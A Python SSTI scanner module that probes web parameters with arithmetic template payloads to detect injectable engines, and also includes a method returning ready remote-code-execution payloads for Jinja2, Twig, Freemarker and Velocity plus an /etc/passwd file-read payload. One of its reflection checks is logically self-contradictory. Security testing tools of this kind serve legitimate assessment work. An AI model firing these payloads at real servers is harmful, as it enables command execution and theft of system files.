"""
Server-Side Template Injection (SSTI) Scanner Module
Detects template injection vulnerabilities in various template engines
"""

import requests
import urllib.parse
from typing import List, Dict, Any
import re
import logging

logger = logging.getLogger(__name__)


class SSTIScanner:
    """
    Server-Side Template Injection vulnerability scanner
    Supports detection for Jinja2, Twig, Freemarker, Velocity, and more
    """
    
    # SSTI detection payloads for different template engines (optimized)
    SSTI_PAYLOADS = {
        'jinja2': [
            "{{7*7}}",
            "{{7*'7'}}"
        ],
        'twig': [
            "{{7*7}}",
            "{{_self}}"
        ],
        'freemarker': [
            "${7*7}",
            "#{7*7}"
        ],
        'velocity': [
            "#set($x=7*7)$x"
        ],
        'smarty': [
            "{7*7}"
        ],
        'mako': [
            "<%=7*7%>"
        ],
        'erb': [
            "<%= 7*7 %>"
        ]
    }
    
    # Expected outputs for detection
    DETECTION_PATTERNS = {
        '49': ['jinja2', 'twig', 'freemarker', 'smarty', 'mako', 'erb'],
        '7777777': ['jinja2', 'twig'],
        'freemarker': ['freemarker'],
        'velocity': ['velocity'],
        'smarty': ['smarty']
    }
    
    def __init__(self, timeout: int = 5):
        """
        Initialize SSTI Scanner
        
        Args:
            timeout: Request timeout in seconds
        """
        self.timeout = timeout
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def scan_url(self, url: str, params: Dict[str, str] = None, method: str = "GET") -> List[Dict[str, Any]]:
        """
        Scan URL for SSTI vulnerabilities
        
        Args:
            url: Target URL
            params: URL parameters or POST data
            method: HTTP method
            
        Returns:
            List of detected SSTI vulnerabilities
        """
        vulnerabilities = []
        
        if not params:
            parsed = urllib.parse.urlparse(url)
            params = dict(urllib.parse.parse_qsl(parsed.query))
            url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        if not params:
            logger.warning(f"No parameters found for {url}")
            return vulnerabilities
        
        logger.info(f"Testing SSTI on {url} with {len(params)} parameters")
        
        # Test each parameter with various template engine payloads
        for param_name in params.keys():
            vulns = self._test_ssti_parameter(url, params, param_name, method)
            vulnerabilities.extend(vulns)
        
        return vulnerabilities
    
    def _test_ssti_parameter(self, url: str, params: Dict, param_name: str, method: str) -> List[Dict[str, Any]]:
        """Test a specific parameter for SSTI"""
        vulnerabilities = []
        
        # Get baseline response
        try:
            if method.upper() == "POST":
                baseline = self.session.post(url, data=params, timeout=self.timeout, verify=False)
            else:
                baseline = self.session.get(url, params=params, timeout=self.timeout, verify=False)
            
            baseline_text = baseline.text
        except Exception as e:
            logger.debug(f"Error getting baseline: {e}")
            return vulnerabilities
        
        # Test each template engine
        for engine, payloads in self.SSTI_PAYLOADS.items():
            for payload in payloads:
                test_params = params.copy()
                test_params[param_name] = payload
                
                try:
                    if method.upper() == "POST":
                        response = self.session.post(url, data=test_params, timeout=self.timeout, verify=False)
                    else:
                        response = self.session.get(url, params=test_params, timeout=self.timeout, verify=False)
                    
                    # Check if template was evaluated
                    if self._is_ssti_vulnerable(payload, response.text, baseline_text):
                        detected_engine = self._identify_template_engine(payload, response.text)
                        
                        vulnerabilities.append({
                            'type': f'Server-Side Template Injection (SSTI) - {detected_engine}',
                            'url': url,
                            'parameter': param_name,
                            'payload': payload,
                            'method': method,
                            'evidence': self._extract_ssti_evidence(response.text, payload),
                            'template_engine': detected_engine,
                            'status_code': response.status_code,
                            'response_snippet': response.text[:500]
                        })
                        logger.warning(f"✗ SSTI ({detected_engine}) detected in {param_name}")
                        return vulnerabilities  # Found vulnerability, stop testing this parameter
                
                except Exception as e:
                    logger.debug(f"Error testing SSTI payload: {e}")
        
        return vulnerabilities
    
    def _is_ssti_vulnerable(self, payload: str, response: str, baseline: str) -> bool:
        """
        Check if SSTI vulnerability exists
        
        Args:
            payload: Test payload
            response: Response with payload
            baseline: Baseline response
            
        Returns:
            bool: True if vulnerable
        """
        # Check for mathematical evaluation (7*7 = 49)
        if '7*7' in payload or '7*\'7\'' in payload:
            if '49' in response and '49' not in baseline:
                return True
            if '7777777' in response and '7777777' not in baseline:
                return True
        
        # Check for template-specific patterns
        template_patterns = [
            r"<class 'list'>",  # Jinja2 object exposure
            r"freemarker\.template",
            r"java\.lang\.Runtime",
            r"Smarty",
            r"mako\.runtime"
        ]
        
        for pattern in template_patterns:
            if re.search(pattern, response, re.IGNORECASE) and not re.search(pattern, baseline, re.IGNORECASE):
                return True
        
        # Check if payload was evaluated (not just reflected)
        if payload in response:
            # Payload reflected but check if it was processed
            if '{{' in payload and '}}' in payload:
                # Check if template delimiters were removed (sign of processing)
                payload_content = re.search(r'\{\{(.+?)\}\}', payload)
                if payload_content:
                    content = payload_content.group(1).strip()
                    # If content appears without delimiters, it was processed
                    if content in response and payload not in response:
                        return True
        
        return False
    
    def _identify_template_engine(self, payload: str, response: str) -> str:
        """Identify which template engine is vulnerable"""
        
        # Check response for engine-specific signatures
        engine_signatures = {
            'jinja2': [r"jinja", r"<class 'list'>", r"config\.items"],
            'twig': [r"twig", r"_self", r"dump\(app\)"],
            'freemarker': [r"freemarker", r"template\.utility"],
            'velocity': [r"velocity", r"java\.lang\.Runtime"],
            'smarty': [r"smarty", r"{\$smarty"],
            'mako': [r"mako", r"mako\.runtime"],
            'erb': [r"erb", r"ruby"]
        }
        
        for engine, signatures in engine_signatures.items():
            for signature in signatures:
                if re.search(signature, response, re.IGNORECASE):
                    return engine.upper()
        
        # Check payload syntax
        if '{{' in payload and '}}' in payload:
            if '49' in response or '7777777' in response:
                return 'Jinja2/Twig'
        elif '${' in payload:
            return 'Freemarker'
        elif '#set' in payload:
            return 'Velocity'
        elif '{' in payload and '}' in payload and '$' in payload:
            return 'Smarty'
        elif '<%' in payload and '%>' in payload:
            if '=' in payload:
                return 'ERB/Mako'
        
        return 'Unknown Template Engine'
    
    def _extract_ssti_evidence(self, response: str, payload: str) -> str:
        """Extract evidence of SSTI from response"""
        
        # Look for evaluated output
        if '49' in response:
            idx = response.find('49')
            start = max(0, idx - 50)
            end = min(len(response), idx + 100)
            return response[start:end]
        
        if '7777777' in response:
            idx = response.find('7777777')
            start = max(0, idx - 50)
            end = min(len(response), idx + 100)
            return response[start:end]
        
        # Look for template-specific output
        patterns = [r"<class.*?>", r"freemarker", r"config\.items", r"smarty"]
        for pattern in patterns:
            match = re.search(pattern, response, re.IGNORECASE)
            if match:
                start = max(0, match.start() - 50)
                end = min(len(response), match.end() + 100)
                return response[start:end]
        
        return "Template injection executed successfully"
    
    def generate_exploitation_payload(self, engine: str) -> Dict[str, str]:
        """
        Generate exploitation payloads for identified template engine
        
        Args:
            engine: Template engine name
            
        Returns:
            Dict with exploitation payloads
        """
        exploits = {
            'jinja2': {
                'rce': "{{ ''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip() }}",
                'file_read': "{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}"
            },
            'twig': {
                'rce': "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
            },
            'freemarker': {
                'rce': "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}"
            },
            'velocity': {
                'rce': "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()#set($out=$ex.getInputStream())"
            }
        }
        
        return exploits.get(engine.lower(), {})


# Example usage
if __name__ == "__main__":
    scanner = SSTIScanner()
    
    test_url = "https://example.com/template"
    test_params = {"name": "test"}
    
    vulnerabilities = scanner.scan_url(test_url, test_params)
    
    print(f"\nFound {len(vulnerabilities)} SSTI vulnerabilities:")
    for vuln in vulnerabilities:
        print(f"  - {vuln['type']} in parameter '{vuln['parameter']}'")
